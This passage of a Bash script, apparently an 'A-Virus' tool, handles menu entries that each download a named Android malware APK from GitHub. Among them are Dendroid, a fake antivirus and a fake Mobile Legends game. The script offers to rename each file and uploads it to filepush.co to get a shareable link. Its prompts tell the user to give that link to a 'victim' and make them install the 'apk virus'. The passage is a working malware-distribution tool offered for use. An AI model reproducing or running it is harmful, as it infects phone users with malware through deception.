         curl --upload-file com.romanticpos.apk https://filepush.co/upload/com.romanticpos.apk
         rm -f com.romanticpos.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 31 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.statetss.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.statetss.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.statetss.apk https://filepush.co/upload/com.statetss.apk
         rm -f com.statetss.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 32 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.thinkking.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.thinkking.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.thinkking.apk https://filepush.co/upload/com.thinkking.apk
         rm -f com.thinkking.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 33 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/crd.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv crd.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file crd.apk https://filepush.co/upload/crd.apk
         rm -f crd.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 34 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/dendroid.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv dendroid.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file dendroid.apk https://filepush.co/upload/dendroid.apk
         rm -f dendroid.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 35 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/ds.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv ds.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file ds.apk https://filepush.co/upload/ds.apk
         rm -f ds.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 36 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/fake_av.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv fake_av.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file fake_av.apk https://filepush.co/upload/fake_av.apk
         rm -f fake_av.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 37 ]; then
      wget https://github.com/Gameye98/V1RU5/raw/master/Grave.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Grave.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Grave.apk https://filepush.co/upload/Grave.apk
         rm -f Grave.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 38 ]; then
      wget https://github.com/Gameye98/V1RU5/raw/master/Malum.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Malum.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Malum.apk https://filepush.co/upload/Malum.apk
         rm -f Malum.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 39 ]; then
      wget https://github.com/Gameye98/V1RU5/raw/master/Mobile_Legends_Adventure.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Mobile_Legends_Adventure.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Mobile_Legends_Adventure.apk https://filepush.co/upload/Mobile_Legends_Adventure.apk
         rm -f Mobile_Legends_Adventure.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 40 ]; then
      wget https://github.com/Gameye98/V1RU5/raw/master/TakeBeer.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv TakeBeer.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file TakeBeer.apk https://filepush.co/upload/TakeBeer.apk
         rm -f TakeBeer.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 41 ]; then
      wget https://github.com/Gameye98/V1RU5/raw/master/elite.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv elite.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file elite.apk https://filepush.co/upload/elite.apk
         rm -f elite.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 42 ]; then
      wget https://github.com/Gameye98/V1RU5/raw/master/mobelejen.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv mobelejen.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file mobelejen.apk https://filepush.co/upload/mobelejen.apk
         rm -f mobelejen.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   else
      echo -e "\e[91mWrong input. Try again.\e[0m"
   fi
   
elif [[ $choose == 2 ]]; then
author
elif [[ $choose == 3 ]]; then
printf "\e[1;93mExiting from A-Virus terminal...\e[0m\n"
sleep 0.5
printf "\e[1;94mGood bye hacker!!😇\e[0m\n"
sleep 0.5
exit 1
elif [[ $choose == 4 ]]; then
cls || clear
figlet updating..
sleep 0.75
cls || clear
figlet wait..
sleep 0.75
cd $HOME
rm -rf A-Virus
git clone https://github.com/AnonymousX11-Debug/A-Virus
cd A-Virus
cls || clear
printf "\e[1;32mUPDATE COMPLETED\e[0m\e[1;33m Run bash A-Virus.sh\e[0m\n"
sleep 0.75
exit 1

else 
printf "\e[1;34mInvalid Command!\e[0m\n"
sleep 0.5
cls || clear
banner
menu
fi
}
menu